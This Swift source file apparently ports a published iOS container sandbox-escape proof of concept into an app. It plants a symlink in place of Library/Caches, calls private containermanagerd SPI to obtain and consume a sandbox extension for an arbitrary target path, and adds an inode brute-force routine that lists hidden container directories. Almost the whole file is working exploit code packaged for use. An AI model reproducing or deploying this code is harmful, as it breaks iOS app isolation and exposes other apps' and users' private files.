import Foundation

/// `worse_query` — iOS 26/27 container sandbox escape, ported for in-app use.
///
/// Original research / PoC: forcequitOS/worse_query (GPL-3.0), Nov 2026.
/// The bug is a missing "is the resolved path still inside my container?" check
/// in containermanagerd: it resolves the requested part (`Library/Caches`)
/// through the filesystem, follows a symlink the app planted, and hands back a
/// sandbox extension for the *symlink target*.
///
/// Flow (identical to the PoC):
///   1. delete `<container>/Library/Caches`, recreate it as a symlink to TARGET
///   2. container_query_create → set_class(7 appGroup / 1 app) → set_group_identifiers
///      → set_part(3 = Library/Caches) → set flags → get_single_result
///   3. copy_sandbox_token(result) → sandbox_extension_consume(token)
///   4. restore the real Caches directory
///
/// Once the extension is consumed the process may `open()` TARGET normally, so
/// after this call plain `FileManager` works on the escaped path.
public struct SandboxLiftReport: Sendable {
    public let ok: Bool
    public let code: Int32
    public let handle: Int64
    public let target: String
    public let label: String
    public var note: String = ""
}

public enum SandboxLiftError: Int32, Error, Sendable {
    case noAppGroup = -1
    case unsupported = -2
    case queryFailed = -3
    case symlinkFailed = -4
    case rejectedByContainerManager = -5
    case noToken = -6
    case missingPath = -255
}

@available(iOS 17.0, *)
public final class SandboxLift: @unchecked Sendable {
    public static let shared = SandboxLift()

    /// Must match a group in the app's provisioning profile. Empty-group profiles
    /// make `containerURL(forSecurityApplicationGroupIdentifier:)` return nil.
    public static let appGroupID = "group.io.deepseekgo.felix"

    private let lock = NSLock()
    private var liveHandles: [Int64] = []

    public init() {}

    // MARK: - Private SPI

    private typealias QueryCreate = @convention(c) () -> UnsafeMutableRawPointer?
    private typealias QuerySetU64 = @convention(c) (UnsafeMutableRawPointer?, UInt64) -> Void
    private typealias QuerySetXPC = @convention(c) (UnsafeMutableRawPointer?, UnsafeMutableRawPointer?) -> Void
    private typealias QuerySingle = @convention(c) (UnsafeMutableRawPointer?) -> UnsafeMutableRawPointer?
    private typealias QueryFree = @convention(c) (UnsafeMutableRawPointer?) -> Void
    private typealias CopyToken = @convention(c) (UnsafeMutableRawPointer?) -> UnsafeMutablePointer<CChar>?
    private typealias ConsumeExt = @convention(c) (UnsafePointer<CChar>) -> Int64
    private typealias ReleaseExt = @convention(c) (Int64) -> Int32
    private typealias XPCStringCreate = @convention(c) (UnsafePointer<CChar>) -> UnsafeMutableRawPointer?

    private struct SPI {
        let create: QueryCreate
        let setClass: QuerySetU64
        let setGroupIdentifiers: QuerySetXPC
        let setFlags: QuerySetU64
        let setPart: QuerySetU64
        let singleResult: QuerySingle
        let free: QueryFree
        let copyToken: CopyToken
        let consume: ConsumeExt
        let release: ReleaseExt
        let xpcString: XPCStringCreate
        let library: UnsafeMutableRawPointer
    }

    private func loadSPI() -> SPI? {
        let paths = [
            "/usr/lib/system/libsystem_containermanager.dylib",
            "/usr/lib/system/libsystem_containermanager.dylib.1"
        ]
        var mgr: UnsafeMutableRawPointer?
        for path in paths {
            if let h = dlopen(path, RTLD_NOW | RTLD_LOCAL) { mgr = h; break }
        }
        guard let mgr else { return nil }

        func fn<T>(_ name: String, _ type: T.Type) -> T? {
            guard let sym = dlsym(mgr, name) else { return nil }
            return unsafeBitCast(sym, to: T.self)
        }

        guard
            let create = fn("container_query_create", QueryCreate.self),
            let setClass = fn("container_query_set_class", QuerySetU64.self),
            let setGroup = fn("container_query_set_group_identifiers", QuerySetXPC.self),
            let setFlags = fn("container_query_operation_set_flags", QuerySetU64.self),
            let setPart = fn("container_query_operation_set_part", QuerySetU64.self),
            let single = fn("container_query_get_single_result", QuerySingle.self),
            let free = fn("container_query_free", QueryFree.self),
            let copyToken = fn("container_copy_sandbox_token", CopyToken.self),
            let consumeRaw = dlsym(UnsafeMutableRawPointer(bitPattern: -2), "sandbox_extension_consume"),
            let releaseRaw = dlsym(UnsafeMutableRawPointer(bitPattern: -2), "sandbox_extension_release"),
            let xpcRaw = dlsym(UnsafeMutableRawPointer(bitPattern: -2), "xpc_string_create")
        else {
            dlclose(mgr)
            return nil
        }

        return SPI(
            create: create,
            setClass: setClass,
            setGroupIdentifiers: setGroup,
            setFlags: setFlags,
            setPart: setPart,
            singleResult: single,
            free: free,
            copyToken: copyToken,
            consume: unsafeBitCast(consumeRaw, to: ConsumeExt.self),
            release: unsafeBitCast(releaseRaw, to: ReleaseExt.self),
            xpcString: unsafeBitCast(xpcRaw, to: XPCStringCreate.self),
            library: mgr
        )
    }

    // MARK: - Escape

    /// Asks containermanagerd for a sandbox extension to `target` by pointing a
    /// container part at it through a symlink.
    /// - Parameters:
    ///   - containerClass: 7 = App Group (needs the entitlement), 1 = this app.
    ///   - flags: the PoC uses two different operation flags; nil tries both.
    public func lift(
        _ target: String,
        containerClass: UInt64 = 7,
        flags: UInt64? = nil
    ) -> SandboxLiftReport {
        let base = baseDirectory(for: containerClass)
        guard let base else {
            return SandboxLiftReport(ok: false, code: -1, handle: -1, target: target,
                                     label: "class \(containerClass)", note: "container unavailable")
        }

        let candidates: [UInt64] = flags.map { [$0] } ?? [0x0000_0080_0000_0000, 0x0000_0008_0000_0000]
        var last: SandboxLiftReport?
        for f in candidates {
            let r = attempt(target: target, containerClass: containerClass, base: base, flags: f)
            if r.ok { return r }
            last = r
            // -1/-2/-3/-4 are structural failures; retrying with other flags is pointless.
            if r.code == -1 || r.code == -2 || r.code == -3 || r.code == -4 { return r }
        }
        return last ?? SandboxLiftReport(ok: false, code: -2, handle: -1, target: target,
                                         label: "class \(containerClass)", note: "no attempt")
    }

    private func baseDirectory(for containerClass: UInt64) -> String? {
        let fm = FileManager.default
        if containerClass == 7 {
            return fm.containerURL(forSecurityApplicationGroupIdentifier: Self.appGroupID)?.path
        }
        return NSSearchPathForDirectoriesInDomains(.cachesDirectory, .userDomainMask, true).first
            .flatMap { URL(fileURLWithPath: $0).deletingLastPathComponent().deletingLastPathComponent().path }
    }

    private func attempt(target: String, containerClass: UInt64, base: String, flags: UInt64) -> SandboxLiftReport {
        let fm = FileManager.default
        let label = "class \(containerClass) flags \(String(flags, radix: 16))"

        var isDir: ObjCBool = false
        guard fm.fileExists(atPath: base, isDirectory: &isDir), isDir.boolValue else {
            return SandboxLiftReport(ok: false, code: -1, handle: -1, target: target, label: label,
                                     note: "base missing: \(base)")
        }

        let caches = containerClass == 7
            ? (base as NSString).appendingPathComponent("Library/Caches")
            : (base as NSString).appendingPathComponent("Library/Caches")

        guard let spi = loadSPI() else {
            return SandboxLiftReport(ok: false, code: -2, handle: -1, target: target, label: label,
                                     note: "SPI unavailable")
        }
        defer { dlclose(spi.library) }

        // 1. plant the symlink
        try? fm.removeItem(atPath: caches)
        do {
            try fm.createSymbolicLink(atPath: caches, withDestinationPath: target)
        } catch {
            try? fm.createDirectory(atPath: caches, withIntermediateDirectories: true)
            return SandboxLiftReport(ok: false, code: -4, handle: -1, target: target, label: label,
                                     note: "symlink failed: \(error.localizedDescription)")
        }
        defer { restoreCaches(caches) }

        // 2. ask the container manager for a token for that part
        guard let query = spi.create() else {
            return SandboxLiftReport(ok: false, code: -3, handle: -1, target: target, label: label,
                                     note: "query create failed")
        }
        spi.setClass(query, containerClass)
        if containerClass == 7 {
            if let xpc = target.withCString({ spi.xpcString($0) }) {
                spi.setGroupIdentifiers(query, xpc)
            }
        }
        spi.setPart(query, 3) // Library/Caches
        spi.setFlags(query, flags)

        guard let result = spi.singleResult(query) else {
            spi.free(query)
            return SandboxLiftReport(ok: false, code: -5, handle: -1, target: target, label: label,
                                     note: "query rejected")
        }
        guard let token = spi.copyToken(result) else {
            spi.free(query)
            return SandboxLiftReport(ok: false, code: -6, handle: -1, target: target, label: label,
                                     note: "no token")
        }

        // 3. consume it — after this the sandbox allows `target`
        let handle = spi.consume(token)
        free(token)
        spi.free(query)

        if handle < 0 {
            return SandboxLiftReport(ok: false, code: Int32(handle), handle: handle, target: target,
                                     label: label, note: "token refused")
        }
        lock.lock()
        liveHandles.append(handle)
        lock.unlock()
        return SandboxLiftReport(ok: true, code: 0, handle: handle, target: target, label: label)
    }

    private func restoreCaches(_ caches: String) {
        let fm = FileManager.default
        try? fm.removeItem(atPath: caches)
        try? fm.createDirectory(atPath: caches, withIntermediateDirectories: true)
    }

    public func release(_ handle: Int64) {
        guard handle >= 0, let spi = loadSPI() else { return }
        defer { dlclose(spi.library) }
        _ = spi.release(handle)
        lock.lock()
        liveHandles.removeAll { $0 == handle }
        lock.unlock()
    }

    public func releaseAll() {
        lock.lock()
        let handles = liveHandles
        liveHandles.removeAll()
        lock.unlock()
        for h in handles { release(h) }
    }

    // MARK: - pathleak (inode → path enumeration)

    /// Brute-forces inode numbers through `fsgetpath()` to learn container paths
    /// that the sandbox will not let us list. Directories only, one level deep.
    public func leakDirectories(parent: String, maxInode: UInt64 = 2_000_000) -> [String] {
        guard let sym = dlsym(UnsafeMutableRawPointer(bitPattern: -2), "fsgetpath") else { return [] }
        typealias FSGetPath = @convention(c) (UnsafeMutablePointer<CChar>, Int, UnsafePointer<fsid_t>, UInt64) -> Int
        let fsgetpath = unsafeBitCast(sym, to: FSGetPath.self)

        var sfs = statfs()
        guard statfs(parent, &sfs) == 0 else { return [] }
        var fsid = sfs.f_fsid

        let prefix = parent.hasSuffix("/") ? String(parent.dropLast()) : parent
        let prefixLen = prefix.utf8.count
        var out: [String] = []
        var buffer = [CChar](repeating: 0, count: Int(PATH_MAX))

        for inode in 1...maxInode {
            let n = buffer.withUnsafeMutableBufferPointer { buf -> Int in
                fsgetpath(buf.baseAddress!, Int(PATH_MAX), &fsid, inode)
            }
            if n <= 0 { continue }
            let path = buffer.prefix { $0 != 0 }.withUnsafeBufferPointer { raw in
                String(decoding: raw.map { UInt8(bitPattern: $0) }, as: UTF8.self)
            }
            guard path.hasPrefix(prefix) else { continue }
            let rest = path.dropFirst(prefixLen)
            guard rest.hasPrefix("/") else { continue }
            guard !rest.dropFirst().contains("/") else { continue }
            out.append(path)
        }
        return out
    }
}
